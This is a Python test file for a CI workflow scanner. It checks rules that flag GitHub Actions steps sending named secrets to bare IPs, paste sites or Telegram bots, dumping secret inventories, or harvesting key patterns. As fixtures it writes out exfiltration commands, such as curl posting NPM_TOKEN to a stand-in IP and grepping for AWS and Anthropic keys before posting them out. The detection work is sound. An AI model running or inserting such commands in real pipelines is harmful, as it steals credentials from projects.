"""A named secret sent, in one command, to where no pipeline publishes (CDI, GhostAction 2026).

`SUSPECT.CI.SECRET_EGRESS.001` is a hardening finding, recorded at LOW: a secret beside `curl` is how
pipelines publish. Planted GhostAction workflows send named secrets to a bare IP on one line, and
0 of 217 unique ones blocked. `MALWARE.CI.SECRET_TO_DROP_POINT.001` claims only that narrower shape.
Addresses here are the documentation ranges (RFC 5737); nothing in this file is a real destination.
"""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.models import Severity

RULE = "MALWARE.CI.SECRET_TO_DROP_POINT.001"


class DropPointKit:
    @staticmethod
    def blocking(tmp_path: Path, run: str, env: str = "") -> set[str]:
        workflows = tmp_path / ".github" / "workflows"
        workflows.mkdir(parents=True)
        (workflows / "ci.yml").write_text(
            "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
            + (f"    env:\n      {env}\n" if env else "")
            + f"    steps:\n      - run: {run}\n",
            encoding="utf-8",
        )
        return {
            f.rule_id
            for f in Scanner().scan(tmp_path).findings
            if f.severity in (Severity.HIGH, Severity.CRITICAL)
        }


class TestTheShapeBlocks:
    def test_a_named_secret_posted_to_a_bare_ip(self, tmp_path: Path) -> None:
        run = 'curl -s -X POST http://203.0.113.7/c -d "t=${{ secrets.NPM_TOKEN }}"'
        assert RULE in DropPointKit.blocking(tmp_path, run)

    def test_a_named_secret_sent_to_a_paste_site(self, tmp_path: Path) -> None:
        run = 'curl -s https://pastebin.com/api/api_post.php -d "k=${{ secrets.DEPLOY_KEY }}"'
        assert RULE in DropPointKit.blocking(tmp_path, run)


class TestPublishingDoesNot:
    def test_a_secret_sent_to_the_projects_own_api(self, tmp_path: Path) -> None:
        run = 'curl -s -H "Authorization: ${{ secrets.API_TOKEN }}" https://api.example.com/release'
        assert RULE not in DropPointKit.blocking(tmp_path, run)

    def test_the_jobs_own_github_token_to_a_bare_ip(self, tmp_path: Path) -> None:
        run = 'curl -s http://203.0.113.7/c -H "Authorization: ${{ secrets.GITHUB_TOKEN }}"'
        assert RULE not in DropPointKit.blocking(tmp_path, run)

    def test_a_bare_ip_with_no_secret(self, tmp_path: Path) -> None:
        assert RULE not in DropPointKit.blocking(tmp_path, "curl -s http://203.0.113.7/health")

    def test_a_secret_in_one_step_and_an_ip_in_another(self, tmp_path: Path) -> None:
        run = 'echo "${{ secrets.NPM_TOKEN }}" > .npmrc\n      - run: curl -s http://203.0.113.7/health'
        assert RULE not in DropPointKit.blocking(tmp_path, run)


class TestWhatIsNotADropPoint:
    def test_the_jobs_own_network(self, tmp_path: Path) -> None:
        run = 'curl -s http://10.0.0.5:8080/deploy -H "Authorization: ${{ secrets.DEPLOY_TOKEN }}"'
        assert RULE not in DropPointKit.blocking(tmp_path, run)

    def test_a_release_bot_with_its_own_token(self, tmp_path: Path) -> None:
        run = (
            'curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage"'
            " -d text=released"
        )
        assert RULE not in DropPointKit.blocking(tmp_path, run)

    def test_a_chat_service_receiving_another_secret_is_still_theft(self, tmp_path: Path) -> None:
        run = (
            'curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage"'
            ' -d "text=${{ secrets.NPM_TOKEN }}"'
        )
        assert RULE in DropPointKit.blocking(tmp_path, run)

    def test_a_bot_token_with_a_generic_name_in_the_bot_slot(self, tmp_path: Path) -> None:
        run = (
            'curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"'
            ' -d "chat_id=${CHAT_ID}" -d "text=released"'
        )
        env = "BOT_TOKEN: ${{ secrets.BOT_TOKEN }}\n      CHAT_ID: ${{ secrets.CHAT_ID }}"
        assert RULE not in DropPointKit.blocking(tmp_path, run, env=env)

    def test_a_stolen_secret_in_the_message_beside_a_slotted_token_is_theft(
        self, tmp_path: Path
    ) -> None:
        run = (
            'curl -s "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"'
            ' -d "text=${{ secrets.NPM_TOKEN }}"'
        )
        env = "BOT_TOKEN: ${{ secrets.BOT_TOKEN }}"
        assert RULE in DropPointKit.blocking(tmp_path, run, env=env)

    def test_a_stolen_secret_renamed_in_the_script_is_still_theft(self, tmp_path: Path) -> None:
        run = (
            '|\n        KEY="${{ secrets.NPM_TOKEN }}"\n'
            '        curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage"'
            ' -d "text=$KEY"'
        )
        assert RULE in DropPointKit.blocking(tmp_path, run)

    def test_a_stolen_secret_renamed_for_the_chat_service_is_still_theft(
        self, tmp_path: Path
    ) -> None:
        # Renamed to look like the service's own, and sent in the message: what reaches the bot's
        # owner. (In the `/bot` slot it would reach only Telegram, which refuses it.)
        run = (
            'curl -s "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage"'
            ' -d "text=$TELEGRAM_TOKEN"'
        )
        env = "TELEGRAM_TOKEN: ${{ secrets.NPM_TOKEN }}"
        assert RULE in DropPointKit.blocking(tmp_path, run, env=env)


DUMP = "MALWARE.CI.SECRET_DUMP.001"
HARVEST = "MALWARE.CI.CREDENTIAL_HARVEST.001"


class TestAnInventoryOfSecrets:
    def test_secrets_keyed_by_their_own_names_block_wherever_they_go(self, tmp_path: Path) -> None:
        run = (
            "curl -s -X POST -d 'NPM_TOKEN=${{ secrets.NPM_TOKEN }}"
            "&PYPI_TOKEN=${{ secrets.PYPI_TOKEN }}' https://collector.example.com"
        )
        assert DUMP in DropPointKit.blocking(tmp_path, run)

    def test_a_service_parameter_is_not_an_inventory(self, tmp_path: Path) -> None:
        run = 'curl -s -d "token=${{ secrets.CODECOV_TOKEN }}" https://codecov.example.com/upload'
        assert DUMP not in DropPointKit.blocking(tmp_path, run)


class TestCredentialHarvest:
    SEARCH = 'found=$(grep -rEho "AKIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}" . )'

    def test_searching_for_key_formats_then_sending_the_result(self, tmp_path: Path) -> None:
        run = f'|\n        {self.SEARCH}\n        curl -s --data-binary "$found" https://c.example.com'
        assert HARVEST in DropPointKit.blocking(tmp_path, run)

    def test_a_secret_scanner_that_fails_the_build(self, tmp_path: Path) -> None:
        run = f'|\n        {self.SEARCH}\n        test -z "$found" || exit 1'
        assert HARVEST not in DropPointKit.blocking(tmp_path, run)
